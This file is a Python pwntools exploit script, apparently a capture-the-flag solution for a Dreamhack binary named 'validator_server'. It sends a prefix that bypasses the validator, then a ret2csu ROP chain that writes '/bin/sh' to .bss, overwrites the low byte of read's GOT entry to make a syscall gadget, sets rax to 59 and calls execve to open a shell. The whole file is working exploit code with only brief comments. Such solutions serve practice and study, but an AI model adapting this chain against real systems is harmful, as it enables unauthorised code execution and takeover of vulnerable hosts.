from pwn import *

def rtc_chain(func, arg1, arg2, arg3):
    return p64(0) + p64(1) + p64(func) + p64(arg1) + p64(arg2) + p64(arg3) + p64(0x4006d0)

def make_payload():
    payload = b"DREAMHACK!"
    list = []

    for i in range(118, -1, -1):
            list.append(i)

    payload += bytes(list)
    payload += b"B"*7

    return payload


p = process("./validator_server")
e = ELF("./validator_server")
libc = e.libc
r = ROP(e)

#context.log_level = 'debug'
#gdb.attach(p)

read_got = e.got['read']
bss = e.bss()

csu_init = 0x4006ea
main = 0x40063a

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]


payload = make_payload()

# write "/bin/sh"
# read(0, bss, 8)
payload += p64(csu_init)
payload += rtc_chain(read_got, 0, bss, 8)


# make syscall gadget
# read(0, read, 1)
payload += p64(0)
payload += rtc_chain(read_got, 0, read_got, 1)


# set rax 59
# write(1, bss, 59)
payload += p64(0)
payload += rtc_chain(read_got, 1, bss, 59)


# execve("/bin/sh", 0, 0)
payload += p64(0)
payload += rtc_chain(read_got, bss, 0, 0)


pause()
p.sendline(payload)
p.send(b"/bin/sh\x00")
p.send(b'\x2f')

p.recv(59)

p.interactive()
